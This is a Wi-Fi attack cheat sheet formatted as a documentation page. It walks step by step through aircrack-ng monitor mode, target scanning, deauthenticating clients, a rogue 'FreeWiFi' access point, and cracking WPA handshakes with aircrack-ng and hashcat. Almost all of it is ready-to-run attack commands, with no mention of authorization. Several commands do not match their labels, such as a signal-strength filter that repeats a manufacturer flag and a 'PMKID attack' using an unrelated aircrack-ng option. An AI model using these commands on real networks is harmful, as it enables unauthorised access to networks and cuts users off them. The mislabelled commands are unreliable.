## üîß Monitor Mode Setup

=== "Basic Setup"
    
    **Check available interfaces:**
    ```bash
    iwconfig
    ```

    **Enable monitor mode:**
    ```bash
    sudo airmon-ng start wlan0
    ```

    **Verify monitor mode:**
    ```bash
    iwconfig
    ```

    !!! tip "Basic Setup"
        - **Check available interfaces**: Involves having a look at which wireless adapters you have available to aircrack.
        - **Enable Monitor Mode**: Depending which adapter you are using, this will start aircrack and put that adapter (wlan0) into monitor mode.
        - **Verify Monitor mode**: iwconfig will show either "Managed" or "Monitor". Your adapter should be in monitor mode for use with Aircrack.

=== "Check Kill Method"
    
    **Kill interfering processes:**
    ```bash
    sudo airmon-ng check kill
    ```

    **Start monitor mode:**
    ```bash
    sudo airmon-ng start wlan0
    ```

    **Verify interface:**
    ```bash
    iwconfig
    ```

    !!! warning "Check Kill Method"
        - **Kill interfering processes**: Stops NetworkManager and other services that might interfere with monitor mode
        - **Start monitor mode**: Enables monitor mode after clearing conflicts
        - **Verify interface**: Confirms the adapter is properly in monitor mode

=== "Manual Setup"
    
    **Bring interface down:**
    ```bash
    sudo ifconfig wlan0 down
    ```

    **Set monitor mode:**
    ```bash
    sudo iwconfig wlan0 mode monitor
    ```

    **Bring interface up:**
    ```bash
    sudo ifconfig wlan0 up
    ```

    **Verify mode:**
    ```bash
    iwconfig
    ```

    !!! danger "Manual Setup"
        - **Bring interface down**: Shuts down the wireless interface before changing mode
        - **Set monitor mode**: Manually configures the interface for monitor mode
        - **Bring interface up**: Restarts the interface in monitor mode
        - **Verify mode**: Confirms the interface is properly configured

## üîç AP Discovery

=== "Basic Scanning"

    **Scan all channels:**
    ```bash
    sudo airodump-ng wlan0mon
    ```

    **Scan specific channel:**
    ```bash
    sudo airodump-ng -c 6 wlan0mon
    ```

    **Scan multiple channels:**
    ```bash
    sudo airodump-ng -c 1,6,11 wlan0mon
    ```

    !!! tip "Basic Scanning"
        - **Scan all channels**: Discovers all wireless networks across all available channels
        - **Scan specific channel**: Focuses on a single channel to reduce noise and interference
        - **Scan multiple channels**: Targets specific channels (like 1, 6, 11) for comprehensive coverage

=== "Target Specific"

    **Target by BSSID:**
    ```bash
    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
    ```

    **Target by ESSID (network name):**
    ```bash
    sudo airodump-ng -c 6 --essid "TargetNetwork" wlan0mon
    ```

    **Target with file output:**
    ```bash
    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
    ```

    !!! info "Target Specific"
        - **Target by BSSID**: Focuses on a specific access point using its MAC address
        - **Target by ESSID**: Targets a network by its name (what users see)
        - **Target with file output**: Captures data to a file for later analysis

=== "Advanced Filtering"

    **Filter by encryption:**
    ```bash
    sudo airodump-ng --encrypt WPA wlan0mon
    ```

    **Filter by manufacturer:**
    ```bash
    sudo airodump-ng --manufacturer "Cisco" wlan0mon
    ```

    **Filter by signal strength:**
    ```bash
    sudo airodump-ng --manufacturer "Netgear" wlan0mon
    ```

    !!! warning "Advanced Filtering"
        - **Filter by encryption**: Shows only networks with specific encryption types (WPA, WEP, etc.)
        - **Filter by manufacturer**: Targets networks from specific router manufacturers
        - **Filter by signal strength**: Focuses on networks with strong signal strength

## ‚ö° Capture Handshake

=== "Passive Capture"

    **Start capture:**
    ```bash
    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
    ```

    !!! tip "Passive Capture"
        - **Start capture**: Begins monitoring the target network for authentication handshakes
        - **Wait for connection**: Patiently waits for clients to connect naturally to the network
        - **Monitor handshake**: Watch for WPA handshake indicator in the top-right corner of airodump

=== "Active Deauth"

    This kind of capture generally requires the use of multiple adapters and multiple terminal screens. If the target network is not very active, we can essentially 'kick' a client off a network and get it to re-authenticate whilst trying to capture the handshake.

    **Terminal 1 - Capture handshake:**
    ```bash
    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
    ```

    **Terminal 2 - Deatuhspecific client:**
    ```bash
    sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC:ADDR wlan1mon
    ```

    !!! warning "Active Deauth"
        - **Terminal 1 - Capture handshake**: Starts monitoring the target network for handshakes
        - **Terminal 2 - Target specific client**: Focuses deauth attack on a specific device

=== "Fake AP Attack"

    **Create fake AP:**
    ```bash
    sudo airbase-ng -a AA:BB:CC:DD:EE:FF --essid "FreeWiFi" wlan0mon
    ```

    **Capture handshakes from connecting clients:**
    ```bash
    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w fake_handshake wlan0mon
    ```

    !!! danger "Fake AP Attack"
        - **Create fake AP**: Sets up a rogue access point with a tempting name
        - **Capture handshakes**: Monitors for clients connecting to the fake network
        - **Social engineering**: Relies on users connecting to the fake "FreeWiFi" network

## üîì Crack Handshake

=== "Dictionary Attack"

    **Basic dictionary attack:**
    ```bash
    sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap
    ```

    **Custom wordlist:**
    ```bash
    sudo aircrack-ng -w /path/to/custom.txt handshake-01.cap
    ```

    **Multiple wordlists:**
    ```bash
    sudo aircrack-ng -w wordlist1.txt,wordlist2.txt handshake-01.cap
    ```

    !!! tip "Dictionary Attack"
        - **Basic dictionary attack**: Uses common password lists like rockyou.txt
        - **Custom wordlist**: Uses specialized wordlists for specific targets
        - **Multiple wordlists**: Combines several wordlists for comprehensive coverage

=== "Brute Force Attack"

    **4-way handshake brute force:**
    ```bash
    sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap
    ```

    **PMKID attack (if supported):**
    ```bash
    sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -r PMKID handshake-01.cap
    ```

    !!! warning "Brute Force Attack"
        - **4-way handshake brute force**: Attempts all possible password combinations
        - **PMKID attack**: Uses newer PMKID method for faster cracking
        - **Resource intensive**: Requires significant computational power and time

=== "Hashcat Integration"

    **Convert cap to hccapx:**
    ```bash
    cap2hccapx handshake-01.cap handshake.hccapx
    ```

    **Hashcat attack:**
    ```bash
    hashcat -m 2500 handshake.hccapx /usr/share/wordlists/rockyou.txt
    ```

    **GPU acceleration:**
    ```bash
    hashcat -m 2500 -d 1 handshake.hccapx /usr/share/wordlists/rockyou.txt
    ```

    !!! danger "Hashcat Integration"
        - **Convert cap to hccapx**: Converts aircrack capture files to hashcat format
        - **Hashcat attack**: Uses hashcat for advanced password cracking techniques
        - **GPU acceleration**: Leverages graphics cards for much faster cracking speeds
